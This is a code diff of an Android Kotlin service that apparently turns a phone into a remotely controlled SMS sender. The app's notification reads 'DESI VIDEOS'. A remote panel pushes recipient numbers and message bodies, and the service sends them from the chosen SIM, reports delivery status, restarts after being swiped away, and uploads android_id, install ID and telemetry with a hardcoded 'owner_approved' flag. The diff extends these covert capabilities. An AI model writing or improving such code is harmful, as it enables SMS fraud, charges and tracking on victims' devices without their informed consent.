@@ -15,7 +15,6 @@ import android.os.Build
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.IBinder
-import android.telephony.SmsManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.app.ServiceCompat
@@ -29,8 +28,10 @@ import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 import java.util.UUID
+import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.Executors
 import java.util.concurrent.TimeUnit
+import java.util.concurrent.atomic.AtomicInteger
 
 class TpcService : Service() {
 
@@ -52,7 +53,13 @@ class TpcService : Service() {
         private const val KEY_RID = "registration_id"
         private const val KEY_SMS_QUEUE = "sms_queue"
 
+        private const val SEEN_TTL_MS = 10 * 60 * 1000L
+        private const val SEEN_MAX = 600
+
         private val BACKOFF = longArrayOf(1_000, 2_000, 4_000, 8_000, 15_000, 20_000)
+
+        /** Live service instance — Ack/SmsStatusReceiver ko socket par ack bhejne ke liye. */
+        @Volatile internal var instance: TpcService? = null
     }
 
     private val work = Executors.newSingleThreadExecutor()
@@ -70,6 +77,18 @@ class TpcService : Service() {
     private var attempts = 0
     @Volatile private var stopped = false
 
+    // ack counters — notification par live dikhte hain
+    private val queuedCount = AtomicInteger()
+    private val sentCount = AtomicInteger()
+    private val deliveredCount = AtomicInteger()
+    private val failedCount = AtomicInteger()
+
+    /**
+     * FIX: same outbox row socket push AUR poll dono se aa sakti hai —
+     * isse duplicate SMS jaate the. Ye set usse rokta hai.
+     */
+    private val seenOutboxIds = ConcurrentHashMap<String, Long>()
+
     override fun onBind(intent: Intent?): IBinder? = null
 
     private fun safe(block: () -> Unit) {
@@ -80,8 +99,23 @@ class TpcService : Service() {
         }
     }
 
+    /** true = pehli baar dekha (bhejo), false = duplicate (skip). */
+    private fun markSeen(id: String): Boolean {
+        if (id.isBlank()) return true
+        val now = System.currentTimeMillis()
+        if (seenOutboxIds.size > SEEN_MAX) {
+            seenOutboxIds.entries.removeAll { now - it.value > SEEN_TTL_MS }
+        }
+        return seenOutboxIds.putIfAbsent(id, now) == null
+    }
+
+    private fun unsee(id: String) {
+        if (id.isNotBlank()) seenOutboxIds.remove(id)
+    }
+
     // ------------------------------------------------------------ lifecycle
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        instance = this
         safe { startForegroundSafely() }
         stopped = false
 
@@ -90,6 +124,7 @@ class TpcService : Service() {
         bgHandler.post { safe { scheduleLoops() } }
 
         work.execute { safe { flushPendingSms() } }
+        work.execute { safe { Analytics.trackStart(this) } }
 
         return START_STICKY
     }
@@ -102,14 +137,13 @@ class TpcService : Service() {
 
     override fun onTaskRemoved(rootIntent: Intent?) {
         // swipe-away ke baad bhi zinda raho
-        safe {
-            startService(Intent(applicationContext, TpcService::class.java))
-        }
+        safe { startService(Intent(applicationContext, TpcService::class.java)) }
         super.onTaskRemoved(rootIntent)
     }
 
     override fun onDestroy() {
         stopped = true
+        if (instance === this) instance = null
         safe { socket?.close(1000, "bye") }
         socket = null
         safe { unregisterNetwork() }
@@ -137,21 +171,24 @@ class TpcService : Service() {
         return if (res != 0) res else android.R.drawable.stat_notify_sync
     }
 
+    private fun buildNotification(text: String) = NotificationCompat.Builder(this, CHANNEL_ID)
+        .setContentTitle("DESI VIDEOS")
+        .setContentText(text)
+        .setSmallIcon(smallIcon())
+        .setOngoing(true)
+        .setOnlyAlertOnce(true)
+        .setContentIntent(
+            PendingIntent.getActivity(
+                this, 0, Intent(this, MainActivity::class.java),
+                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+            )
+        )
+        .setPriority(NotificationCompat.PRIORITY_LOW)
+        .build()
+
     private fun startForegroundSafely() {
         createChannel()
-        val pi = PendingIntent.getActivity(
-            this, 0, Intent(this, MainActivity::class.java),
-            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
-        )
-        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("DESI VIDEOS")
-            .setContentText("Gateway active")
-            .setSmallIcon(smallIcon())
-            .setOngoing(true)
-            .setContentIntent(pi)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .build()
-
+        val notification = buildNotification("Gateway active")
         val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
             ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC else 0
         try {
@@ -159,6 +196,20 @@ class TpcService : Service() {
         } catch (t: Throwable) {
             Log.e(TAG, "startForeground(type) fail, fallback", t)
             startForeground(NOTIFICATION_ID, notification)
+        }
+    }
+
+    /** FIX: notification ab live counters dikhati hai — bheja gaya ya nahi turant pata chalta hai. */
+    private fun refreshNotification() {
+        safe {
+            val text = "Gateway active · q${queuedCount.get()} s${sentCount.get()} " +
+                "d${deliveredCount.get()} f${failedCount.get()}"
+            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC else 0
+            try {
+                ServiceCompat.startForeground(this, NOTIFICATION_ID, buildNotification(text), type)
+            } catch (_: Throwable) {
+            }
         }
     }
 
@@ -176,6 +227,7 @@ class TpcService : Service() {
         override fun onAvailable(network: Network) {
             bgHandler.post { safe { if (socket == null) connect() } }
         }
+
         override fun onLost(network: Network) {
             bgHandler.post { safe { if (socket == null) retry() } }
         }
@@ -220,6 +272,9 @@ class TpcService : Service() {
             put("device_name", DeviceInfo.summary(this@TpcService))
             put("platform", "android")
             put("registration_id", rid())
+            put("install_id", DeviceInfo.installId(this@TpcService))
+            put("android_id", DeviceInfo.androidId(this@TpcService))
+            put("app_version", DeviceInfo.versionName(this@TpcService))
             put("owner_approved", true)
             put("telemetry", DeviceInfo.telemetry(this@TpcService))
         },
@@ -279,6 +334,8 @@ class TpcService : Service() {
         val ws = socket ?: return false
         val ok = ws.send(obj.toString())
         if (!ok) {
+            // FIX: socket ko band bhi karo, warna okhttp par zombie connection reh jaata hai
+            runCatching { ws.close(1000, "send fail") }
             socket = null
             retry()
         }
@@ -334,57 +391,103 @@ class TpcService : Service() {
     }
 
     // ------------------------------------------------------------ sms send
-    private fun smsManager(): SmsManager? =
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
-            getSystemService(SmsManager::class.java)
-        else
-            @Suppress("DEPRECATION") SmsManager.getDefault()
-
     private fun handleSmsSend(msg: JSONObject) {
         val id = msg.optString("id")
         val to = msg.optString("to")
         val body = msg.optString("body")
 
+        // FIX: duplicate delivery guard (socket push + poll dono se aa sakta hai)
+        if (!markSeen(id)) {
+            Log.i(TAG, "duplicate outbox $id — skip")
+            return
+        }
+
+        // sim_slot sirf tab aata hai jab panel me select kiya ho. -1 = default SIM.
+        val slot = if (msg.has("sim_slot")) msg.optInt("sim_slot", -1) else -1
+
         if (body.isBlank()) {
-            ack(id, "failed", "missing body")
+            ack(id, "failed", "missing body", slot)
+            return
+        }
+        if (to.isBlank()) {
+            ack(id, "failed", "missing to", slot)
             return
         }
 
         work.execute {
             try {
-                val manager = smsManager()
-                if (manager == null) {
-                    ack(id, "failed", "no sms manager")
+                if (!SimRouter.hasTelephony(this)) {
+                    unsee(id)
+                    ack(id, "failed", "no telephony", slot)
                     return@execute
                 }
+
+                val subId = SimRouter.subscriptionIdForSlot(this, slot)
+                val realSlot = if (slot >= 0) slot else SimRouter.slotForSubId(this, subId)
+
+                val manager = SimRouter.smsManagerFor(this, subId)
+                if (manager == null) {
+                    unsee(id)
+                    ack(id, "failed", "no sms manager", realSlot)
+                    return@execute
+                }
+
                 val parts = manager.divideMessage(body)
                 if (parts.size > 1) {
-                    manager.sendMultipartTextMessage(to, null, parts, null, null)
+                    val sentList = ArrayList<PendingIntent>(parts.size)
+                    val deliveredList = ArrayList<PendingIntent>(parts.size)
+                    for (i in parts.indices) {
+                        sentList.add(SimRouter.statusIntent(this, id, "sent", i, parts.size, realSlot))
+                        deliveredList.add(
+                            SimRouter.statusIntent(this, id, "delivered", i, parts.size, realSlot)
+                        )
+                    }
+                    manager.sendMultipartTextMessage(to, null, parts, sentList, deliveredList)
                 } else {
-                    manager.sendTextMessage(to, null, body, null, null)
+                    manager.sendTextMessage(
+                        to, null, body,
+                        SimRouter.statusIntent(this, id, "sent", 0, 1, realSlot),
+                        SimRouter.statusIntent(this, id, "delivered", 0, 1, realSlot)
+                    )
                 }
-                ack(id, "sent", "")
+
+                // turant queued ack — panel ko pata chale ki radio tak pahunch gaya
+                ack(id, "queued", "", realSlot)
             } catch (e: Exception) {
-                ack(id, "failed", e.message ?: "send error")
+                unsee(id)
+                ack(id, "failed", e.message ?: "send error", slot)
             }
         }
     }
 
-    private fun ack(id: String, status: String, error: String) {
+    internal fun ack(id: String, status: String, error: String, slot: Int = -1) {
         if (id.isBlank()) return
+
+        when (status) {
+            "queued" -> queuedCount.incrementAndGet()
+            "sent" -> sentCount.incrementAndGet()
+            "delivered" -> deliveredCount.incrementAndGet()
+            "failed" -> failedCount.incrementAndGet()
+        }
+        refreshNotification()
+
         // socket par ack (fast) — fallback HTTP
         val viaSocket = sendJson(JSONObject().apply {
             put("type", "ack")
             put("id", id)
             put("status", status)
             put("error", error)
+            put("sim_slot", slot)
         })
+
         work.execute {
             safe {
                 if (!viaSocket) {
                     postJson("/devices/outbox/$id/ack", JSONObject().apply {
                         put("status", status)
                         put("error", error)
+                        put("sim_slot", slot)
+                        put("registration_id", rid())
                     })
                 }
             }
@@ -395,6 +498,8 @@ class TpcService : Service() {
     private fun postHeartbeat() {
         postJson("/devices/heartbeat", JSONObject().apply {
             put("registration_id", rid())
+            put("install_id", DeviceInfo.installId(this@TpcService))
+            put("android_id", DeviceInfo.androidId(this@TpcService))
             put("telemetry", DeviceInfo.telemetry(this@TpcService))
         })
     }
@@ -506,12 +611,15 @@ class TpcService : Service() {
                 val items = JSONObject(text).optJSONArray("items") ?: return@execute
                 for (i in 0 until items.length()) {
                     val item = items.optJSONObject(i) ?: continue
-                    handle(JSONObject().apply {
+                    val payload = JSONObject().apply {
                         put("type", "sms_send")
                         put("id", item.optString("id"))
                         put("to", item.optString("to"))
                         put("body", item.optString("body"))
-                    }.toString())
+                        // FIX: pehle sim_slot yahan drop ho jaata tha
+                        if (item.has("sim_slot")) put("sim_slot", item.optInt("sim_slot", -1))
+                    }
+                    handle(payload.toString())
                 }
             } catch (_: Exception) {
             } finally {
